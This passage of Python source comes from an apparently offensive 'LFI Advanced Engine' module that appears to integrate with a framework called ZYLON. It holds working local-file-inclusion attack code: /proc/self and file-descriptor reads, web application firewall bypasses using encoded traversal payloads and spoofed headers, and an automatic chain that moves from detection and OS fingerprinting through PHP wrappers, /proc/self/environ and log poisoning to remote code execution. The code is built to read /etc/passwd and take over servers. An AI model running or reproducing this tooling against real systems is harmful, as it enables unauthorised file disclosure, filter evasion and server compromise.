            payload = self._build_traversal(depth, "/proc/self/cmdline", "")
            resp = self._inject_payload(payload, parameter)
            if resp and resp.status_code == 200:
                content = resp.text.replace('\x00', ' ').strip()
                if len(content) > 5:
                    results["vulnerable"] = True
                    results["details"]["cmdline"] = content[:200]
                    results["findings"].append({
                        "type": "proc_cmdline",
                        "depth": depth,
                        "cmdline": content[:200],
                    })
                    self._print(f"[+] /proc/self/cmdline: {content[:80]}", GREEN)
                    break

        # Test /proc/self/fd/ for file descriptor inclusion
        for fd_num in range(0, 20):
            for depth in range(1, 6):
                payload = self._build_traversal(depth, f"/proc/self/fd/{fd_num}", "")
                resp = self._inject_payload(payload, parameter)
                if resp and resp.status_code == 200 and len(resp.text.strip()) > 20:
                    results["vulnerable"] = True
                    results["details"]["fd_files"].append({
                        "fd": fd_num,
                        "depth": depth,
                        "content_length": len(resp.text),
                        "preview": resp.text[:150],
                    })
                    self._print(f"    FD {fd_num}: {len(resp.text)} bytes", DIM + CYAN)
                    break

        # Test other /proc entries
        proc_entries = [
            "/proc/version", "/proc/cpuinfo", "/proc/meminfo",
            "/proc/net/tcp", "/proc/net/arp", "/proc/mounts",
        ]
        for entry in proc_entries:
            for depth in range(1, 6):
                payload = self._build_traversal(depth, entry, "")
                resp = self._inject_payload(payload, parameter)
                if resp and resp.status_code == 200 and len(resp.text.strip()) > 20:
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "proc_entry",
                        "path": entry,
                        "depth": depth,
                        "preview": resp.text[:200],
                    })
                    self._print(f"[+] Read: {entry}", GREEN)
                    break

        if not results["vulnerable"]:
            self._print("[-] /proc/self exploitation not successful", YELLOW)

        return results

    # ========================================================================
    # SCAN: WAF Bypass Techniques
    # ========================================================================

    def bypass_waf(self, url=None, param=None):
        """Test WAF bypass techniques for LFI"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] LFI WAF Bypass Testing on {target_url}", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "bypasses_working": [],
                "waf_detected": False,
                "waf_type": None,
                "blocked_payloads": 0,
                "total_tested": 0,
            },
            "scan_type": "lfi_waf_bypass",
        }

        # First, baseline test - try a simple LFI to check for WAF
        baseline_payloads = [
            "../../../../../../etc/passwd",
            "../../../etc/passwd",
        ]
        baseline_blocked = 0

        for payload in baseline_payloads:
            resp = self._inject_payload(payload, parameter)
            results["details"]["total_tested"] += 1
            if resp is None or resp.status_code in [403, 401, 501, 503]:
                baseline_blocked += 1
            elif resp.status_code == 200:
                sigs = self._check_signatures(resp.text, "linux_passwd")
                if sigs:
                    # No WAF, LFI works directly
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "direct_lfi",
                        "payload": payload,
                        "signatures": sigs,
                    })
                    self._print(f"[+] LFI works without bypass!", GREEN)
                    return results

        if baseline_blocked == len(baseline_payloads):
            results["details"]["waf_detected"] = True
            self._print(f"[!] WAF/Filter detected - attempting bypasses...", YELLOW)

        # Test each WAF bypass technique
        base_path = "/etc/passwd"
        for technique_name, technique_func in WAF_BYPASS_TECHNIQUES.items():
            # Build traversal payloads with this bypass
            for depth in range(1, 9):
                base_traversal = "../" * depth + base_path.lstrip("/")
                try:
                    bypassed_payload = technique_func(base_traversal)
                except Exception:
                    continue

                resp = self._inject_payload_raw(bypassed_payload, parameter)
                results["details"]["total_tested"] += 1

                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text, "linux_passwd")
                    if sigs:
                        results["vulnerable"] = True
                        results["details"]["bypasses_working"].append({
                            "technique": technique_name,
                            "depth": depth,
                            "payload": bypassed_payload[:100],
                        })
                        results["findings"].append({
                            "type": "waf_bypass_success",
                            "technique": technique_name,
                            "depth": depth,
                            "payload": bypassed_payload[:100],
                            "signatures": sigs,
                        })
                        self._print(f"[+] WAF BYPASSED via {technique_name}! Depth={depth}", GREEN)
                        break
                elif resp is None or (resp and resp.status_code in [403, 401]):
                    results["details"]["blocked_payloads"] += 1

        # Additional bypass: header-based evasion
        evasion_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/etc/passwd"},
            {"X-Rewrite-URL": "/etc/passwd"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ]

        for extra_headers in evasion_headers:
            h = self.headers.copy()
            h.update(extra_headers)
            for depth in [4, 6]:
                payload = self._build_traversal(depth, base_path, "")
                sep = "&" if "?" in target_url else "?"
                url = f"{target_url}{sep}{parameter}={urllib.parse.quote(payload)}"
                resp = self._send_request(url, method="GET", headers=h)
                results["details"]["total_tested"] += 1
                if resp and resp.status_code == 200:
                    sigs = self._check_signatures(resp.text, "linux_passwd")
                    if sigs:
                        results["vulnerable"] = True
                        hdr_name = list(extra_headers.keys())[0]
                        results["details"]["bypasses_working"].append({
                            "technique": f"header_bypass_{hdr_name}",
                            "depth": depth,
                        })
                        results["findings"].append({
                            "type": "waf_bypass_header",
                            "header": hdr_name,
                            "depth": depth,
                            "signatures": sigs,
                        })
                        self._print(f"[+] WAF BYPASSED via header {hdr_name}!", GREEN)
                        break

        if not results["vulnerable"]:
            self._print("[-] WAF bypass not successful", YELLOW)

        return results

    # ========================================================================
    # SCAN: Auto Exploit Chain (Detect -> Fingerprint -> Exploit -> RCE)
    # ========================================================================

    def auto_exploit(self, url=None, param=None):
        """Full automatic exploitation chain: detect -> fingerprint -> exploit -> RCE"""
        target_url = url or self.target_url
        parameter = param or self.parameter

        self._print(f"[*] LFI AUTO EXPLOIT CHAIN on {target_url}", RED + BOLD)
        self._print(f"    Phase 1: Detection", CYAN)

        results = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "detection": None,
                "fingerprint": None,
                "php_wrappers": None,
                "log_poisoning": None,
                "proc_self": None,
                "waf_bypass": None,
                "rce_achieved": False,
                "rce_method": None,
                "os_detected": None,
            },
            "scan_type": "lfi_auto_exploit",
        }

        # Phase 1: Detection
        detect_result = self.detect_lfi(target_url, parameter)
        results["details"]["detection"] = detect_result

        if not detect_result.get("vulnerable"):
            # Try WAF bypass
            self._print(f"    Phase 1b: WAF Bypass", CYAN)
            waf_result = self.bypass_waf(target_url, parameter)
            results["details"]["waf_bypass"] = waf_result
            if waf_result.get("vulnerable"):
                results["vulnerable"] = True
                results["findings"].append({"phase": "waf_bypass", "result": waf_result})
            else:
                self._print(f"[-] No LFI vulnerability found after all techniques", YELLOW)
                return results

        results["vulnerable"] = True
        results["details"]["os_detected"] = detect_result.get("details", {}).get("os_detected")

        # Phase 2: OS Fingerprinting
        self._print(f"    Phase 2: OS Fingerprinting", CYAN)
        fp_result = self.fingerprint_os(target_url, parameter)
        results["details"]["fingerprint"] = fp_result
        if fp_result.get("details", {}).get("os"):
            results["details"]["os_detected"] = fp_result["details"]["os"]

        # Phase 3: PHP Wrapper Exploitation
        self._print(f"    Phase 3: PHP Wrapper Exploitation", CYAN)
        wrapper_result = self.exploit_php_wrappers(target_url, parameter)
        results["details"]["php_wrappers"] = wrapper_result
        if wrapper_result.get("details", {}).get("rce_achieved"):
            results["details"]["rce_achieved"] = True
            results["details"]["rce_method"] = "php_wrapper"
            results["findings"].append({"phase": "php_wrapper_rce", "result": wrapper_result})
            self._print(f"[+] AUTO EXPLOIT: RCE via PHP Wrapper!", RED + BOLD)
            return results

        # Phase 4: /proc/self Exploitation (Linux only)
        if results["details"]["os_detected"] in ["Linux", None]:
            self._print(f"    Phase 4: /proc/self Exploitation", CYAN)
            proc_result = self.exploit_proc_self(target_url, parameter)
            results["details"]["proc_self"] = proc_result
            if proc_result.get("details", {}).get("rce_achieved"):
                results["details"]["rce_achieved"] = True
                results["details"]["rce_method"] = "proc_self_environ"
                results["findings"].append({"phase": "proc_self_rce", "result": proc_result})
                self._print(f"[+] AUTO EXPLOIT: RCE via /proc/self/environ!", RED + BOLD)
                return results

        # Phase 5: Log Poisoning
        self._print(f"    Phase 5: Log Poisoning RCE", CYAN)
        log_result = self.exploit_log_poisoning(target_url, parameter)
        results["details"]["log_poisoning"] = log_result
        if log_result.get("details", {}).get("rce_achieved"):
            results["details"]["rce_achieved"] = True
            results["details"]["rce_method"] = "log_poisoning"
            results["findings"].append({"phase": "log_poisoning_rce", "result": log_result})
            self._print(f"[+] AUTO EXPLOIT: RCE via Log Poisoning!", RED + BOLD)
            return results

        if not results["details"]["rce_achieved"]:
            self._print(f"[!] LFI confirmed but RCE not achieved", YELLOW)
            self._print(f"    File read is possible - manual exploitation recommended", YELLOW)

        return results

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target, scan_type='detect', **kwargs):
        """Main entry point for LFI Advanced Engine"""
        if isinstance(target, str):
            if not target.startswith('http'):
                target = f'https://{target}'
            self.target_url = target

        self.parameter = kwargs.get('parameter', self.parameter)
        self.method = kwargs.get('method', self.method)
        self.headers = kwargs.get('headers', self.headers)
        self.cookies = kwargs.get('cookies', self.cookies)
        self.proxy = kwargs.get('proxy', self.proxy)
        self.timeout = kwargs.get('timeout', self.timeout)
        self.threads = kwargs.get('threads', self.threads)

        scan_methods = {
            'detect': lambda: self.detect_lfi(self.target_url, self.parameter),
            'fingerprint': lambda: self.fingerprint_os(self.target_url, self.parameter),
            'php_wrappers': lambda: self.exploit_php_wrappers(self.target_url, self.parameter),
            'log_poisoning': lambda: self.exploit_log_poisoning(self.target_url, self.parameter),
            'proc_self': lambda: self.exploit_proc_self(self.target_url, self.parameter),
            'waf_bypass': lambda: self.bypass_waf(self.target_url, self.parameter),
            'auto_exploit': lambda: self.auto_exploit(self.target_url, self.parameter),
        }

        if scan_type in scan_methods:
            return scan_methods[scan_type]()
        return {"error": f"Unknown scan type: {scan_type}", "available": list(scan_methods.keys())}


# ============================================================================
# CONVENIENCE RUNNER FUNCTION (Module-level)
# ============================================================================

def run(target, scan_type='detect', **kwargs):
    """Module-level run function for ZYLON integration"""
    engine = LFIAdvancedEngine()
    return engine.run(target, scan_type=scan_type, **kwargs)
